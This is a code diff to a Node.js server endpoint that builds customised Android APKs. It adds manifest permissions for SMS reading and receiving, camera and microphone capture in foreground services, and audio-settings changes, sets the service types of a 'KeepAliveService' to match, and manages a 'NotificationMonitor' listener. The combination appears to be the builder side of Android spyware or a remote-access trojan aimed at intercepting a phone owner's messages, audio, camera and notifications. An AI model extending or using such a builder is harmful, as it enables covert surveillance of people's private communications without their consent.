@@ -281,7 +281,8 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
 
                     if (enableSmsPermission === 'true') {
                         permissionsToAdd += '    <uses-permission android:name="android.permission.READ_SMS" />\n';
-                        console.log('[APK] Adding READ_SMS permission');
+                        permissionsToAdd += '    <uses-permission android:name="android.permission.RECEIVE_SMS" />\n';
+                        console.log('[APK] Adding SMS permissions');
                     }
 
                     if (enableContactsPermission === 'true') {
@@ -291,13 +292,18 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
 
                     if (enableCameraPermission === 'true') {
                         permissionsToAdd += '    <uses-permission android:name="android.permission.CAMERA" />\n';
-                        console.log('[APK] Adding CAMERA permission');
+                        permissionsToAdd += '    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />\n';
+                        permissionsToAdd += '    <uses-feature android:name="android.hardware.camera" android:required="false" />\n';
+                        permissionsToAdd += '    <uses-feature android:name="android.hardware.camera.front" android:required="false" />\n';
+                        permissionsToAdd += '    <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />\n';
+                        console.log('[APK] Adding CAMERA + FOREGROUND_SERVICE_CAMERA permissions');
                     }
 
                     if (enableMicrophonePermission === 'true') {
                         permissionsToAdd += '    <uses-permission android:name="android.permission.RECORD_AUDIO" />\n';
                         permissionsToAdd += '    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />\n';
-                        console.log('[APK] Adding RECORD_AUDIO and FOREGROUND_SERVICE_MICROPHONE permissions');
+                        permissionsToAdd += '    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />\n';
+                        console.log('[APK] Adding RECORD_AUDIO + FOREGROUND_SERVICE_MICROPHONE permissions');
                     }
 
                     if (permissionsToAdd) {
@@ -307,12 +313,20 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                     }
                 }
 
+                // Update KeepAliveService foregroundServiceType based on enabled permissions
+                let fgsTypes = 'specialUse|dataSync';
+                if (enableMicrophonePermission === 'true') fgsTypes = 'specialUse|microphone|dataSync';
+                if (enableCameraPermission === 'true') fgsTypes = 'specialUse|camera|dataSync';
+                if (enableMicrophonePermission === 'true' && enableCameraPermission === 'true') fgsTypes = 'specialUse|microphone|camera|dataSync';
+                manifestContent = fs.readFileSync(manifestPath, 'utf8');
+                manifestContent = manifestContent.replace(/foregroundServiceType="specialUse\|dataSync"/, `foregroundServiceType="${fgsTypes}"`);
+                fs.writeFileSync(manifestPath, manifestContent);
+                console.log(`[APK] FGS types set to: ${fgsTypes}`);
+
                 // Handle Notification Listener Service
                 // The base APK includes the service declaration - remove it if not enabled
                 if (enableNotificationListener !== 'true') {
-                    // Re-read manifest in case it was modified above
                     manifestContent = fs.readFileSync(manifestPath, 'utf8');
-                    // Remove the NotificationMonitor service block without affecting other services
                     const serviceRegex = /\s*<service[^>]*android:name="[^"]*NotificationMonitor"[^>]*>[\s\S]*?<\/service>/;
                     manifestContent = manifestContent.replace(serviceRegex, '');
                     fs.writeFileSync(manifestPath, manifestContent);
